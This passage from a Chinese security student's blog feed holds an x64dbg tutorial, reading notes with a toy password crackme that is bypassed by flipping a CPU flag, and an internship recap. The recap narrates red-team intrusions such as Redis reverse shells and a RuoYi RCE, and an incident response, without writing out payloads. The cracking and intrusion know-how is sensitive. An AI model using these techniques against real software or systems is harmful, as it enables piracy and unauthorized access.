src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_10-35-39.png"></p><p>在选项中，杂项，设置本地符号路径</p><p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_10-38-21.png"></p><h4 id="使用符号文件"><a href="#使用符号文件" class="headerlink" title="使用符号文件"></a>使用符号文件</h4><p>很多情况下，x64dbg不会自动加载符号文件，大概率是防止同时加载过多导致程序崩溃，这时候就需要我们手动加载了</p><p>首先需要下载符号文件，打开符号页面，右键.dll，可以发现有下载选项，点击下载即可，但是由于是默认加载微软的符号服务器，所以建议打开代理下载😋</p><p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_10-44-43.png"></p><p>这里也可以选择下载所有dll的符号，下载到我们之前设置的文件夹下😁</p><p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_10-48-49.png"></p><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><p>通常打开一个程序的界面分为4块：</p><p>反汇编，寄存器，内存，系统栈</p><p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_10-55-47.png"></p><p>关于调试按钮，就自己看咯，在左上角那里，应该比较好理解的</p><h4 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h4><p>搜索字符串：右键汇编代码区，搜索，选择搜索模块，选择搜索内容，单步运行到这里搜索当前模块的字符串内容结果，当然这个感觉没有IDA的好用😁，所以我一般是两个一起看</p><p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_10-59-28.png"></p><p>双击就可以到字符串在反汇编处</p><p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_11-03-29.png"></p><h4 id="编辑字符串"><a href="#编辑字符串" class="headerlink" title="编辑字符串"></a>编辑字符串</h4><p>下面学习如何修改字符串常量，首先在反汇编窗口定位到字符串位置，然后在该句信息的窗口双击虚拟内存地址，会x64dbg在内存窗口自动给你跳转到对应位置，</p><p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_13-49-32.png"></p><p>用鼠标选中需要编辑的位置，右键打开二进制编辑器</p><p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_13-54-15.png"></p><p>可以发现如果没有修改到原字符串的大小，是不会覆盖的，</p><p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_13-56-18.png"></p><p>关于这里为什么能在反汇编中动态改变，是因为反汇编区域默认是将在内存中内容读取并解析成相关的汇编代码</p><p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_14-10-08.png"></p><h4 id="一些配置"><a href="#一些配置" class="headerlink" title="一些配置"></a>一些配置</h4><p>在选项中，会有一些配置更改的设置，现在我们来看一看</p><ul><li>事件：就是x64dbg自动暂停的事件，这里也解释了我在阅读笔记1中的疑问，为什么会自动暂停，因为我之前安装的时候勾选了系统断点🤣，这里我们改回去，只保留在入口断点暂停</li></ul><p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_14-40-13.png"></p><ul><li>对于引擎和异常保持默认即可</li><li>反汇编：我这里仅修改了图中三处</li></ul><p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_14-44-13.png"></p><ul><li>杂项：可以将搜索引擎改为百度：<a href="https://www.baidu.com/s?wd=@topic">https://www.baidu.com/s?wd=@topic</a>  遇到不认识的函数选中，右键，符号名称帮助，直接进行查询。</li></ul><h4 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h4><p>在帮助里面</p><p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_14-48-38.png"></p><h4 id="显示指令提示"><a href="#显示指令提示" class="headerlink" title="显示指令提示"></a>显示指令提示</h4><p>右键反汇编区，选择显示提示或隐藏</p><p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_14-49-50.png"></p><h4 id="发布"><a href="#发布" class="headerlink" title="发布"></a>发布</h4><p>右键汇编区代码，然后选择补丁，修补文件即可发布crack版本，注意不要和源文件重名，快捷键Ctrl+P</p><p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_15-06-36.png"></p><p>可以发现已经修改了字符串</p><p><img src="/2023/11/11/x64dbg%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/Snipaste_2023-11-11_15-08-34.png"></p>]]></content>
    
    
    <categories>
      
      <category>工具使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>0Day安全软件漏洞分析第2版阅读随笔1</title>
    <link href="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/"/>
    <url>/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/</url>
    
    <content type="html"><![CDATA[<h1 id="0Day安全软件漏洞分析第2版阅读随笔1"><a href="#0Day安全软件漏洞分析第2版阅读随笔1" class="headerlink" title="0Day安全软件漏洞分析第2版阅读随笔1"></a>0Day安全软件漏洞分析第2版阅读随笔1</h1><p>最近发现了一本2011年再版的好书，《0Day安全软件漏洞分析第2版》，浅浅阅读了几章，发现对现在刚入门逆向工程的我来说有极大的帮助，便写下了这篇随笔。书的部分内容有些过时，我会结合现在的技术加以补充😉</p><span id="more"></span><h2 id="第一章-基础知识"><a href="#第一章-基础知识" class="headerlink" title="第一章-基础知识"></a>第一章-基础知识</h2><h3 id="一些常识"><a href="#一些常识" class="headerlink" title="一些常识"></a>一些常识</h3><h4 id="公布漏洞的权威机构"><a href="#公布漏洞的权威机构" class="headerlink" title="公布漏洞的权威机构"></a>公布漏洞的权威机构</h4><p>（1） <a href="http://cve.mitre.org/">CVE (Common Vulnerabilities and Exposures)</a> 截至目前，这里收录了两万多个漏洞。CVE 会对每个公布的漏洞进行编号、审查。CVE 编号通常也是引用漏洞的标准方式。 </p><p>（2）<a href="http://www.cert.org/">CERT(Computer Emergency Response Team)</a> 计算机应急响应组往往会在第一时间跟进当前的严重漏洞，包括描述信息、POC 的发布链接、厂商的安全响应进度、 用户应该采取的临时性防范措施等。</p><h4 id="何为0Day"><a href="#何为0Day" class="headerlink" title="何为0Day"></a>何为0Day</h4><p>​        微软每个月第二周的星期二发布补丁，这一天通常被称为<code>Black Tuesday</code>，因为会有许多攻击者通宵达旦地去研究这些补丁 patch 了哪些漏洞，并写出 exploit。因为在补丁刚刚发布的一段时 间内，并非所有用户都能及时修复，故这种新公布的漏洞也有一定利用价值。有时把攻击这种 刚刚被 patch 过的漏洞称为 1 day 攻击（patch 发布后1天，叫做1day，5天叫做 5day，未发 patch 统称 0 day）</p><h4 id="必备工具"><a href="#必备工具" class="headerlink" title="必备工具"></a>必备工具</h4><h5 id="OllyDbg"><a href="#OllyDbg" class="headerlink" title="OllyDbg"></a>OllyDbg</h5><p>Ollydbg 是一个集成了反汇编分析、十六进制编辑、动态调试等多种功能于一身的功能强大的调试器。</p><p>但是仅支持动态调试32位的系统。</p><h5 id="IDAPro"><a href="#IDAPro" class="headerlink" title="IDAPro"></a>IDAPro</h5><p>IDA 好像是一张二进制的地图，通过它的标注功能可以迅速掌握大量汇编代码的架构，不至于在繁杂的二进制迷宫中迷失方向。目前版本的 IDA 甚至可以用图形方式显示出一个函数内部的执行流程。</p><h5 id="x64dbg"><a href="#x64dbg" class="headerlink" title="x64dbg"></a>x64dbg</h5><p>通过这款调试工具用户可以分析64位的应用，这是OllyDbg所不能做到的，它只能分析32位应用，所以想要分析64位应用，x64dbg是一款专门用于分析64位应用的调试软件。</p><h5 id="二进制编辑器"><a href="#二进制编辑器" class="headerlink" title="二进制编辑器"></a>二进制编辑器</h5><p>比较著名的十六进制编辑器包括 UltraEdit、Hex Workshop 和 WinHex 和 010 editor</p><h3 id="二进制文件概述"><a href="#二进制文件概述" class="headerlink" title="二进制文件概述"></a>二进制文件概述</h3><h4 id="PE文件格式"><a href="#PE文件格式" class="headerlink" title="PE文件格式"></a>PE文件格式</h4><p>​     <strong>PE，是<code>Portable Executable</code>的缩写，是<code>Win32</code>平台下可执行文件所遵守的数据格式。像<code>.exe</code>、<code>.dll</code>都是典型的PE文件。在文件执行时，操作系统会按照PE文件格式的约定去相应的地方调用资源，然后装入内存的不同区域。</strong></p><p>PE文件格式将可执行文件分为了几个数据节，一个典型的分节：</p><ul><li>.text: 由编译器产生，存放二进制的机器码，也是我们反汇编和调试的对象。</li><li>.data: 初始化的数据块，如宏定义、全局变量、静态变量等</li><li>.idata: 动态链接库等外来函数的信息</li><li>.rsrc: 程序资源，如图标、菜单等、</li></ul><p><strong>但我们需要注意的是，节可以被任意命名，并且代码的任意部分可以编译到PE的任意节中，如果可执行文件经过了“加壳”处理，PE 的节信息就会变得非常“古怪”。 在 Crack 和反病毒分析中需要经常处理这类古怪的 PE 文件。</strong></p><h4 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h4><p>在内核状态下，我们才能看到并调试物理内存。所以用户态下，我们用调试器看到的都是虚拟内存。Windows让所有的程序都认为自己拥有独立的4GB的内存，这当然是不可能的哈哈的😁</p><p>如下图展示：</p><p><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-25_22-21-19.png"></p><p>这里书中有个比喻非常精妙：</p><ul><li>内存管理机制就像银行</li><li>进程&#x3D;用户</li><li>内存管理器&#x3D;银行</li><li>物理内存&#x3D;现金</li><li>虚拟内存&#x3D;存款</li><li>当进程（用户）需要使用物理内存（现金）的时候，它就会向银行（内存管理器）申请将虚拟内存（存款）映射为物理内存。</li></ul><h4 id="PE文件与虚拟内存间的映射"><a href="#PE文件与虚拟内存间的映射" class="headerlink" title="PE文件与虚拟内存间的映射"></a>PE文件与虚拟内存间的映射</h4><p>​        在静态调试中，我们看到的某个指令的位置，它是当前函数调用相对于磁盘文件得到的，也就是文件偏移。我们还需要知道这条指令在内存中的位置，即虚拟内存地址。</p><ul><li><strong>文件偏移地址</strong>：数据在PE文件中相对于文件开头的地址，<strong>这里的意思就是文件没有运行的时候</strong>。</li><li><strong>装载基址</strong>：PE装入内存时的基地址。默认情况下，EXE 文件在虚拟内存中的基地址是 0x00400000，DLL 文件是 0x10000000。这些位置可以通过修改编译选项更改。</li><li><strong>虚拟内存地址</strong>：PE文件中机制被装入内存后的地址。</li><li><strong>相对虚拟地址</strong>：内存地址相对于映射基址的偏移量。</li><li><strong>相对虚拟地址&#x3D;虚拟内存地址-装载基址</strong></li></ul><p><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-25_22-58-02.png"></p><p>​        <strong>操作系统在装载时基本上不会破坏程序的各种数据结构，所以文件地址和相对虚拟地址有很大的一致性，但是存在存放基本单位的差别。</strong></p><ul><li>文件数据按0x200字节为基本单位进行组织，PE数据节的大小始终是0x200的整数倍</li><li>内存数据按0x1000字节为基本单位进行组织，内存数据节的大小始终是0x1000的整数倍</li><li>这种由文件单位引起的<strong>节基址差</strong>称作节偏移，所以<strong>文件偏移地址&#x3D;虚拟内存地址-装载基址-节地址差</strong></li></ul><p><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-26_13-32-23.png"></p><p><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-26_13-32-38.png"></p><h3 id="crack-me1"><a href="#crack-me1" class="headerlink" title="crack_me1"></a>crack_me1</h3><p>实验代码来源于原书</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PASSWORD <span class="hljs-string">&quot;1234567&quot;</span> </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">verify_password</span> <span class="hljs-params">(<span class="hljs-type">char</span> *password)</span> <br>&#123; <br>    <span class="hljs-type">int</span> authenticated; <br>    authenticated=<span class="hljs-built_in">strcmp</span>(password,PASSWORD); <br>    <span class="hljs-keyword">return</span> authenticated; <br>&#125; <br><br>main() <br>&#123; <br>    <span class="hljs-type">int</span> valid_flag=<span class="hljs-number">0</span>; <br>    <span class="hljs-type">char</span> password[<span class="hljs-number">1024</span>]; <br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>) <br>    &#123; <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;please input password: &quot;</span>); <br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,password); <br>        valid_flag = verify_password(password); <br>        <span class="hljs-keyword">if</span>(valid_flag) <br>        &#123; <br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;incorrect password!\n\n&quot;</span>); <br>        &#125; <br>        <span class="hljs-keyword">else</span> <br>        &#123; <br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Congratulation! You have passed the verification!\n&quot;</span>); <br>            <span class="hljs-keyword">break</span>; <br>        &#125; <br>    &#125; <br>&#125;<br></code></pre></td></tr></table></figure><p>使用命令<code>gcc -o crack_me.exe test.c</code>编译为64位的exe文件，当然如果你不是<code>x86-64</code>架构，那么命令有所变化，需要编为32位的程序😋。</p><p><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-26_21-35-25.png"></p><p>接下来，使用IDA查看文件结构，这个时候假装我们不知道代码是自己写的😁</p><p>可以看到如下的文件结构：</p><p><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-26_21-37-10.png"></p><p><strong>这里普及一下：红色的线表示if语句为真，绿色的线表示if语句结果为假</strong></p><p>然后可以发现，我们需要得到<code>Congratulation!</code>，那么用鼠标选中这条线，按空格切换到汇编代码：</p><p><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-26_21-41-37.png"></p><p>使用了一个<code>jz</code>指令，这里我们需要知道这条指令由状态标志寄存器的ZF位决定，为1则跳转</p><p>ZF表示结果运算是否为0，如果为0则置1，反之置0。</p><p>所以这里我只需要让ZF&#x3D;1即可</p><p>将程序拖进x64dbg里，然后程序会自动运行，这里读者不知道为什么会自动中断😂，这里直接继续运行</p><p><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-26_21-46-55.png"></p><p>到需要我们输入密码即可，这里我们需要寻找之前分析出来的判断位置，然后下断点，修改标志位即可破解成功！</p><p><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-26_21-49-19.png"></p><p>我们可以通过调用堆栈窗口，查看crack_me.exe的调用，然后查找出来位置，然后在即将跳转的那个指令处打下断点，可以发现这里<code>x64gbd</code>汇编出来是<code>je</code>指令，笔者这里还不清楚为什么会这样😭。当然这里效果和jz是一样，破解方法不变。</p><p><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-26_21-51-51.png"></p><p>然后在terminal里输入密码，就会在断点处停下，在视图右侧会显示当前CPU的一些寄存器的状态，修改ZF&#x3D;1再单步调试到输出即可。</p><p><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-26_21-55-57.png"></p><p>破解成功！原密码为1234567</p><p><img src="/2023/10/26/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%941/Snipaste_2023-10-26_21-59-46.png"></p><p>第一章学习完毕！</p><p>之前有些基础，所以觉得不难，但是还是觉得这本书太适合入门了，写的很清晰明了的😍</p>]]></content>
    
    
    <categories>
      
      <category>读书笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>读书笔记</tag>
      
      <tag>软件与系统安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>大二暑期某乙方厂实习纪实</title>
    <link href="/2023/10/14/%E5%A4%A7%E4%BA%8C%E6%9A%91%E6%9C%9F%E6%9F%90%E4%B9%99%E6%96%B9%E5%8E%82%E5%AE%9E%E4%B9%A0%E7%BA%AA%E5%AE%9E/"/>
    <url>/2023/10/14/%E5%A4%A7%E4%BA%8C%E6%9A%91%E6%9C%9F%E6%9F%90%E4%B9%99%E6%96%B9%E5%8E%82%E5%AE%9E%E4%B9%A0%E7%BA%AA%E5%AE%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="暑期实习复盘"><a href="#暑期实习复盘" class="headerlink" title="暑期实习复盘"></a>暑期实习复盘</h1><p>开始上课了就没有更新博客了的😭，现在复盘一下暑假在某安全公司实习的经历吧</p><span id="more"></span><h2 id="Part1——bj市Hvv"><a href="#Part1——bj市Hvv" class="headerlink" title="Part1——bj市Hvv"></a>Part1——bj市Hvv</h2><p>话说来真的很幸运，恰巧学校和某盟有个合作，来学校给我们讲课，刚好碰上bj市Hvv，感觉是他们没人想去哈哈，就在学生里找人去，然后我这个小菜鸡之前接触过一点，就被拉去当黑奴了，拿着160一天去当攻击队，笑死。不过之前没参加过Hvv，就当长见识了了😋</p><h3 id="Hvv之坐牢"><a href="#Hvv之坐牢" class="headerlink" title="Hvv之坐牢"></a>Hvv之坐牢</h3><p>​一共是3个人来着，我和一个大三的学长，然后一个某盟的师傅，然后我俩没接触过，导致前两天连外网打点都不熟悉笑死，一天就只能收集一丁点站点信息。然后就是无尽的坐牢，最开始只会用<code>Layer</code>爆破个子域名，后续就不知道咋办了，钓鱼也不会的🐸，后面师傅给了一个<code>Kscan</code>，意外的还挺好用，但是还是坐牢。bj市的靶标太难打了，某医院的蓝队，我就扫描了一下网站后台目录，直接给我IP封了笑死。靶标里还有<code>ByteDance</code>笑死，感觉根本没人打，之后调整为公共靶标后还是没人打。发现了几处<code>shiro</code>，但是没用，感觉早就被打烂然后修了，白激动一阵。反正吧，打点手法太匮乏，前几天都没啥收获，坐牢！🤣</p><h3 id="Hvv之突破"><a href="#Hvv之突破" class="headerlink" title="Hvv之突破"></a>Hvv之突破</h3><p>​继坐牢3天后，发现些许弱口令，但是都没有太大的突破。突然在一处靶标的边缘站点发现了一处弱口令，找到了百万条缴费数据信息，拿到了一些数据分（这么多才给1200多分🤣），有了开门红之后，好像相继就出现了一些可打的资产。</p><p>​在一处站点发现了弱口令，并且是<code>若依CMS</code>，直接用<code>Nday</code>下定时任务打出<code>RCE</code>，但是后面出现了一个问题，这网站跑在<code>docker</code>里的笑死，也不能虚拟化逃逸，最终只能乖乖就范，内网没戏了，只有一丢丢分啦，真的栓Q了是😅，只有一丢丢分啦。</p><p>​之后通过师傅的社工，社工到了一个站点的密码，然后发现不是站点密码，扫描端口发现有<code>Redis</code>服务，诶，用这密码给连上了，嘿嘿，然后快乐定时任务，弹个<code>shell</code>上来，直接拿下，后面内网就是师傅在弄了，反正就是搭个<code>frp</code>，做内网穿透就是。然后上<code>fscan</code>狂扫嘿嘿。这个站拿下了不少分还是。</p><p><img src="/2023/10/14/%E5%A4%A7%E4%BA%8C%E6%9A%91%E6%9C%9F%E6%9F%90%E4%B9%99%E6%96%B9%E5%8E%82%E5%AE%9E%E4%B9%A0%E7%BA%AA%E5%AE%9E/Redis_GETSHELL.jpg"></p><p>​然后后面几天确实就没啥收获了，该打的资产都打了，自己还是太菜了，不过也没关系啦，反正就是去玩一玩。</p><h2 id="Part2——去公司当黑奴"><a href="#Part2——去公司当黑奴" class="headerlink" title="Part2——去公司当黑奴"></a>Part2——去公司当黑奴</h2><p>​本来不是很想去的，但是想着去体验一把，还是去了，结果是去当黑奴的😅，咋就这么缺人呢，我就是一个实习生，都给我派的啥活真是</p><h3 id="Lenovo三进三出——达成次次摸🐟成就"><a href="#Lenovo三进三出——达成次次摸🐟成就" class="headerlink" title="Lenovo三进三出——达成次次摸🐟成就"></a>Lenovo三进三出——达成次次摸🐟成就</h3><p>​实现第三天就被派出去出任务了，第一天是联想，上午赶到公司都10点了，去联想食堂吃了顿饭，食堂真大捏，鼠鼠羡慕捏。任务就是有个啥系统，每年都在测，年年都是那个问题，没意思，然后就是带我的师傅水一水报告然后就完事，结果带我那个师傅说他很快就要离职去大厂了笑死，感觉这公司不太好待呀，然后就是摸了一天的🐟，美美回学校。</p><p>​二入联想，又被叫去联想了，真的栓Q好嘛，这次任务又贼难，开发了个云平台，然后做测试，不是啊，我只是个实习生，叫我来干这活，无语死了，然后就是假装自己会，然后艰难地度过了一个下午，而且第一天传东西的时候把冰蝎给传过去了，然后被说了，我只是一个没参加过培训的实习生，我好想逃~~~😅。然后第二天又去了，依旧是坐牢一整天，甲方估计也看出来了我是个实习生，然后我就安安心心摸了一天的🐟。</p><p>​后面就没有去了，因为要开始国护了，嘿嘿，逃过一劫！</p><h3 id="单枪匹马闯gongan总部——悟出甲方是Daddy的真理"><a href="#单枪匹马闯gongan总部——悟出甲方是Daddy的真理" class="headerlink" title="单枪匹马闯gongan总部——悟出甲方是Daddy的真理"></a>单枪匹马闯gongan总部——悟出甲方是Daddy的真理</h3><p>​实习第二周，第一天被通知去北京gongan总部做渗透测试，一个人，啊哈？？？不是，真不把我当实习生啊，然后就苦逼地去了的😅结果一去，别人把我当大佬笑死，我真的栓Q，我这上头也是能吹，什么垃圾公司啊😅</p><p>​第一件事就是更换一下设备的证书，这个还好，一会就搞完了，话说第二个，叫我一下午测100多个系统，？？？，我真的是钱难挣💩难吃，而且只能拿他那里的破电脑做，光是我弄东西都花了我一个多小时，然后就是疯狂测试，压力是真的大，还在旁边盯着我，不敢吱声，无语死了，还好最后测出来了5、6个，不然我这真的绷不住。最后还把自己电脑充电线忘了，第二天早上还去拿。</p><p>​什么破公司！</p><h3 id="某公司应急响应——唯一有意思的项目"><a href="#某公司应急响应——唯一有意思的项目" class="headerlink" title="某公司应急响应——唯一有意思的项目"></a>某公司应急响应——唯一有意思的项目</h3><p>​唯一有意思的一次任务，和一个还在试用期的师傅，和搞技术的一起确实舒服很多，狗屁项目经理啥也不会，笑死😓。这次是某公司服务器被黑了然后被种了🐎子，找我们来找谁是小黑子（溯源）。大侦探办案，统统闪开！🤣</p><p>​经过一系列的分析以及提供给我们的已知信息，可以确定的是有人（估计是HR之类的公开信息比较多）的密码是弱口令或者通过社工字典给爆出来了，然后被小黑子摸上了外部VPN，然后小黑子开始畅游北京网络。</p><p>​首先是有一个禅道的OA系统，由于使用了和外部VPN相同的账密，直接被登入，后台存在越权漏洞，直接提权到管理账号，导致信息被泄露。至于泄露了多少信息，没有排查出来，但是可能泄露了许多账密。</p><p>​其次，通过摸排服务器的访问日志发现，小黑子扫到了一个测试服务器的SSH弱口令，诶哟，这小黑子运气真不错哦，凌晨3点连上的，这年轻人真能熬呀。由于这台测试服务器和南京那边的服务器是互通的，然后他通过这台测试服务器直接达到了南京那边的一个服务器上。</p><p>​具体手法分析出来，估计小黑子是先搭了一个隧道，访问到南京那边的服务器上存在的一个Jenkins应用，Jenkins用的是弱口令<code>a1234567</code>，被爆了，直接登陆进去，然后由于这个web应用自带执行脚本的功能，直接被小黑子种了🐎子。不要再用弱口令啦！😊😊</p><p>​然后小黑子通过南京那边的服务器以SSH私钥连接上了北京这边的文件共享服务器，我就很好奇这里，为啥在北京这边内网漫游的时候没发现，还得绕这么大一个圈子🤣，这小黑子真是。而且这SSH私钥是咋来的，不知道是不是那台服务器上泄露了还是怎么样，只有甲方自己清楚了。然后同样是中了相同的🐎子。</p><p>​下面就是整个攻击链路：</p><p><img src="/2023/10/14/%E5%A4%A7%E4%BA%8C%E6%9A%91%E6%9C%9F%E6%9F%90%E4%B9%99%E6%96%B9%E5%8E%82%E5%AE%9E%E4%B9%A0%E7%BA%AA%E5%AE%9E/%E6%8C%87%E6%8E%8C%E6%98%93%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94.jpg"></p><p>​</p><h2 id="Part3——实习感概"><a href="#Part3——实习感概" class="headerlink" title="Part3——实习感概"></a>Part3——实习感概</h2><p><strong>想上学，想读书，不想当黑奴！！！</strong></p><p><strong>提升学历，做回自己！！！</strong></p>]]></content>
    
    
    <categories>
      
      <category>实习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>实习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>与Re的初次邂逅</title>
    <link href="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/"/>
    <url>/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/</url>
    
